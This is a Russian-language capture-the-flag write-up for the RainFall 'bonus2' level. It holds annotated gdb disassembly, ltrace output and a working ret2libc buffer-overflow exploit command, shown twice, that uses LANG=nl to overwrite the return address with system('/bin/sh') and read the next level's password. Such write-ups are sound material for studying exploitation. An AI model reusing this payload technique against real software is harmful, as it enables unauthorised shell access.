# Решение

export LANG="nl"
./bonus2 $(python -c 'print "A"*4 + "\xb7\xf8\xcc\x58"[::-1] + "A"*1488') $(python -c 'print "A"*23 + "\xb7\xe6\xb0\x60"[::-1]')
whoami
bonus3
cd ../bonus3
cat .pass
71d4***587



#Объяснение

1. Анализируем поведение программы
bonus2@RainFall:~$ ./bonus2 AAA BBB
Hello AAA

Программа принимает строго два аргумента. Возвращает Hello [первый аргумент].

bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBB
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

Если ввести длинный первый аргумент, то увидим в выводе программы, что появится и второй аргумент.

bonus2@RainFall:~$ ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)

Если ввести достаточно длинные первый и второй аргумент, будет segfault.

2. ltrace
bonus2@RainFall:~$ ltrace ./bonus2 AA BB
__libc_start_main(0x8048529, 3, 0xbffff6e4, 0x8048640, 0x80486b0 <unfinished ...>
strncpy(0xbffff5e0, "AA", 40)                     = 0xbffff5e0
strncpy(0xbffff608, "BB", 32)                     = 0xbffff608
getenv("LANG")                                    = "en_US.UTF-8"
memcmp(0xbffffed5, 0x804873d, 2, 0xb7fff918, 0)   = -1
memcmp(0xbffffed5, 0x8048740, 2, 0xb7fff918, 0)   = -1
strcat("Hello ", "AA")                            = "Hello AA"
puts("Hello AA"Hello AA
)                                  = 9
+++ exited (status 9) +++

Видим использование небезопасных функций strncmp (могут оставить открытую строку).

3. GDB

(gdb) disas main

   0x08048529 <+0>:	    push   %ebp             // пролог
   0x0804852a <+1>:	    mov    %esp,%ebp
   0x0804852c <+3>:	    push   %edi
   0x0804852d <+4>:	    push   %esi
   0x0804852e <+5>:	    push   %ebx
   0x0804852f <+6>:	    and    $0xfffffff0,%esp // выравниваем стек
   0x08048532 <+9>:	    sub    $0xa0,%esp       // выделяем 160 байт на стеке
if(==)
   0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)   // Проеряем, что программе передано два аргумента
   0x0804853c <+19>:	je     0x8048548 <main+31>  // если два аргумента, прыгаем на +31
   0x0804853e <+21>:	mov    $0x1,%eax        // кладем 1 в EAX
   0x08048543 <+26>:	jmp    0x8048630 <main+263> // прыгаем в +263

   0x08048548 <+31>:	lea    0x50(%esp),%ebx  // кладем указатель на буфер 80 байт в EBX
   0x0804854c <+35>:	mov    $0x0,%eax        // кладем 0 в EAX
   0x08048551 <+40>:	mov    $0x13,%edx       // кладем 19 в EDX
   0x08048556 <+45>:	mov    %ebx,%edi        // кладем адрес буфера в EDI
   0x08048558 <+47>:	mov    %edx,%ecx        // кладем 19 в ECX
   0x0804855a <+49>:	rep stos %eax,%es:(%edi) // пробегаем по буферу и первые 19 байт устанавливаем в 0
   0x0804855c <+51>:	mov    0xc(%ebp),%eax   // адрес argv кладем в EAX
   0x0804855f <+54>:	add    $0x4,%eax        // прибаляем 4 к значению EAX. => argv+1
   0x08048562 <+57>:	mov    (%eax),%eax      // разыменовываем argv+1 => argv[1] и кладем в EAX
   0x08048564 <+59>:	movl   $0x28,0x8(%esp)  // кладем 40 на стек (3 аргумент)
   0x0804856c <+67>:	mov    %eax,0x4(%esp)   // кладем argv[1] на стек (2 аргумент)
   0x08048570 <+71>:	lea    0x50(%esp),%eax  // кладем адрес буфера в EAX
   0x08048574 <+75>:	mov    %eax,(%esp)      // кладем адрес буфера 40байт на стек (1 аргумент)
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt> // выполняем strncpy с аргументами
   0x0804857c <+83>:	mov    0xc(%ebp),%eax   // адрес argv кладем в EAX
   0x0804857f <+86>:	add    $0x8,%eax        // прибаляем 8 к значению EAX. => argv+2
   0x08048582 <+89>:	mov    (%eax),%eax      // разыменовываем argv+2 => argv[2] и кладем в EAX
   0x08048584 <+91>:	movl   $0x20,0x8(%esp)  // кладем 32 на стек (3 аргумент)
   0x0804858c <+99>:	mov    %eax,0x4(%esp)   // кладем адрес argv[2] на стек (3 аргумент)
   0x08048590 <+103>:	lea    0x50(%esp),%eax  // кладем адрес в EAX
   0x08048594 <+107>:	add    $0x28,%eax       // передвигаем указатель на адрес буфера в 40 байт
   0x08048597 <+110>:	mov    %eax,(%esp)      // кладем 40байт буфера на стек (1 аргумент)
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>  // выполняем strncpy c аргументами
   0x0804859f <+118>:	movl   $0x8048738,(%esp)    // кладем адрес строки "LANG" на вершину стека (аргумент)
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>   // выпоняем вызов getenv с аргументом
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)      // указательн на строку-результат getenv кладем на стек
   if (==)
   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)      // проверка, вернула ли что-то getenv
   0x080485ba <+145>:	je     0x8048618 <main+239> // если getenv ничего не вернула, прыгаем на +239
   if (==)
   0x080485bc <+147>:	movl   $0x2,0x8(%esp)       // кладем 2 на стек (3 аргумент)
   0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp) // кладем адрес строки "fi" на стек (2 аргумент)
   0x080485cc <+163>:	mov    0x9c(%esp),%eax      // адрес результата getenv кладем в EAX
   0x080485d3 <+170>:	mov    %eax,(%esp)          // адрес результата getenv кладем на стек (1 аргумент)
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt> // выполняем memcmp с у аргументами
   0x080485db <+178>:	test   %eax,%eax            // проверка на 0
   0x080485dd <+180>:	jne    0x80485eb <main+194> // если значения в memcmp не равны, прыгаем на +194
   0x080485df <+182>:	movl   $0x1,0x8049988       // кладем 1 по адресу 0x8049988 (глобальная переменная language)
   0x080485e9 <+192>:	jmp    0x8048618 <main+239> // прыгаем на +239
        if (==)
   0x080485eb <+194>:	movl   $0x2,0x8(%esp)       // кладем 2 на стек (3 аргумент)
   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp) // кладем адрес строки "nl" на стек
   0x080485fb <+210>:	mov    0x9c(%esp),%eax      // адрес результата getenv кладем в EAX
   0x08048602 <+217>:	mov    %eax,(%esp)          // адрес результата getenv кладем на стек (1 аргумент)
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>   // выполняем memcmp с у аргументами
   0x0804860a <+225>:	test   %eax,%eax            // проверка на 0
   0x0804860c <+227>:	jne    0x8048618 <main+239> // если значения в memcmp не равны, прыгаем на +239
   0x0804860e <+229>:	movl   $0x2,0x8049988       // кладем 2 по адресу 0x8049988 (глобальная переменная language)

   0x08048618 <+239>:	mov    %esp,%edx            // адрес вершины стека кладем в EDX - указатель на новую переменную
   0x0804861a <+241>:	lea    0x50(%esp),%ebx      // адрес буфера кладем в EBX
   0x0804861e <+245>:	mov    $0x13,%eax           // кладем 19 в EAX
   0x08048623 <+250>:	mov    %edx,%edi            // указатель на новую переменную кладем в EDI
   0x08048625 <+252>:	mov    %ebx,%esi            // адрес буфера кладем в ESI
   0x08048627 <+254>:	mov    %eax,%ecx            // 19 кладем в ECX
   0x08048629 <+256>:	rep movsl %ds:(%esi),%es:(%edi) // копируем не более 19 символов из буфера в новый указатель
   0x0804862b <+258>:	call   0x8048484 <greetuser> // вызываем greetuser с новой переменной
   0x08048630 <+263>:	lea    -0xc(%ebp),%esp
   0x08048633 <+266>:	pop    %ebx
   0x08048634 <+267>:	pop    %esi
   0x08048635 <+268>:	pop    %edi
   0x08048636 <+269>:	pop    %ebp
   0x08048637 <+270>:	ret


(gdb) disas greetuser

   0x08048484 <+0>:	    push   %ebp                 // пролог
   0x08048485 <+1>:	    mov    %esp,%ebp
   0x08048487 <+3>:	    sub    $0x58,%esp           // выделяем 88 байт на стеке
   0x0804848a <+6>:	    mov    0x8049988,%eax       // значение глобальной переменной language кладем в EAX
   if (language == 1)
   0x0804848f <+11>:	cmp    $0x1,%eax            // сравниваем значение language с 1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54> // если равны, прыгаем на +54
   if (language == 2)
   0x08048494 <+16>:	cmp    $0x2,%eax            // сравниваем значение language с 1
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> // если равны, прыгаем на +101
   if (language == 0)
   0x08048499 <+21>:	test   %eax,%eax            // если 0
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>    // если не 0, прыгаем на +134
   0x0804849d <+25>:	mov    $0x8048710,%edx      // адрес строки "Hello " кладем в EDX
   0x080484a2 <+30>:	lea    -0x48(%ebp),%eax     // адрес буфера кладем в EAX
   0x080484a5 <+33>:	mov    (%edx),%ecx          // часть строки "Hell" кладем в ECX
   0x080484a7 <+35>:	mov    %ecx,(%eax)          // часть строки "Hell" кладем в буфер
   0x080484a9 <+37>:	movzwl 0x4(%edx),%ecx       // смещаем указатель на место после "Hell"
   0x080484ad <+41>:	mov    %cx,0x4(%eax)        // кладем "o " в буфер
   0x080484b1 <+45>:	movzbl 0x6(%edx),%edx       // кладем 0 в edx
   0x080484b5 <+49>:	mov    %dl,0x6(%eax)        // закрываем строку
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134> // прыгаем на +134
   if (language == 1) продолжение
   0x080484ba <+54>:	mov    $0x8048717,%edx      // берем строку "Hyvää päivää " !! Дальше логика, как в прошлом if
   0x080484bf <+59>:	lea    -0x48(%ebp),%eax
   0x080484c2 <+62>:	mov    (%edx),%ecx
   0x080484c4 <+64>:	mov    %ecx,(%eax)
   0x080484c6 <+66>:	mov    0x4(%edx),%ecx
   0x080484c9 <+69>:	mov    %ecx,0x4(%eax)
   0x080484cc <+72>:	mov    0x8(%edx),%ecx
   0x080484cf <+75>:	mov    %ecx,0x8(%eax)
   0x080484d2 <+78>:	mov    0xc(%edx),%ecx
   0x080484d5 <+81>:	mov    %ecx,0xc(%eax)
   0x080484d8 <+84>:	movzwl 0x10(%edx),%ecx
   0x080484dc <+88>:	mov    %cx,0x10(%eax)
   0x080484e0 <+92>:	movzbl 0x12(%edx),%edx
   0x080484e4 <+96>:	mov    %dl,0x12(%eax)
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   if (language == 2) продолжение
   0x080484e9 <+101>:	mov    $0x804872a,%edx // берем строку "Goedemiddag! " !! Дальше логика, как в предыдущем if
   0x080484ee <+106>:	lea    -0x48(%ebp),%eax
   0x080484f1 <+109>:	mov    (%edx),%ecx
   0x080484f3 <+111>:	mov    %ecx,(%eax)
   0x080484f5 <+113>:	mov    0x4(%edx),%ecx
   0x080484f8 <+116>:	mov    %ecx,0x4(%eax)
   0x080484fb <+119>:	mov    0x8(%edx),%ecx
   0x080484fe <+122>:	mov    %ecx,0x8(%eax)
   0x08048501 <+125>:	movzwl 0xc(%edx),%edx
   0x08048505 <+129>:	mov    %dx,0xc(%eax)
   0x08048509 <+133>:	nop


   0x0804850a <+134>:	lea    0x8(%ebp),%eax       // адрес аргумента функции кладем в EAX
   0x0804850d <+137>:	mov    %eax,0x4(%esp)       // кладем адрес аргумента на стек (2 аргумент)
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax     // адрес буфера кладем в eax
   0x08048514 <+144>:	mov    %eax,(%esp)          // буфера кладем на стек (1 аргумент)
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>   // вызываем strcat с двумя аргументами
   0x0804851c <+152>:	lea    -0x48(%ebp),%eax     // адрес буфера кладем в EAX
   0x0804851f <+155>:	mov    %eax,(%esp)          // адрес буфера кладем в стек (аргумент)
   0x08048522 <+158>:	call   0x8048390 <puts@plt> // вызываем puts с аргументом
   0x08048527 <+163>:	leave
   0x08048528 <+164>:	ret

4. Взлом

В функции main используется буфер для записи в него argv[1] и argv[2].
Затем часть буфера с argv[1] подается в greetuser, по идее, строка не должна превышать длину 40 байт.
Если же подать первый аргумент 40 байт, то копии argv[1] и argv[2] будут восприниматься, как одна строка,
тк между ними не будет '\0'. В итоге, в greetuser можно передать строку до 72 байт.

Сам же буфер в greetuser - 72 байт и при копировании в буфер приветственного сообщения, а затем буферв из main,
он переполнится. Чтобы хватило байт для перезаписи адрес возврата, надо сменить язык с анлийского на nl или fi,
тк приветствия на этиъ языках длиннее.

Вычисляем, сколько надо байт для перезаписи адрес возврата:
начало буфера 0xbffff500
адрес возврата 0xbffff54c

Между началом буфера и адресов возврата 76 байт.

В адрес возврата мы запишем вызов system.
(gdb) info func system

0xb7e6b060  __libc_system
0xb7e6b060  system  -- то, что нужно
0xb7f49550  svcerr_systemerr

так как при вызове функции, она берет аргумент на смешении -4, в на смещении 4 находится буфер main,
мы запишем в буфер (во вторые 4 байта) адрес на строку /bin/sh/

Адреc /bin/sh найдем в динамической библиотеке. (info proc map)
(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
0xb7f8cc58

Эксплойт:
export LANG="nl"

./bonus2 $(python -c 'print "A"*4 + "\xb7\xf8\xcc\x58"[::-1] + "A"*1488') $(python -c 'print "A"*23 + "\xb7\xe6\xb0\x60"[::-1]')

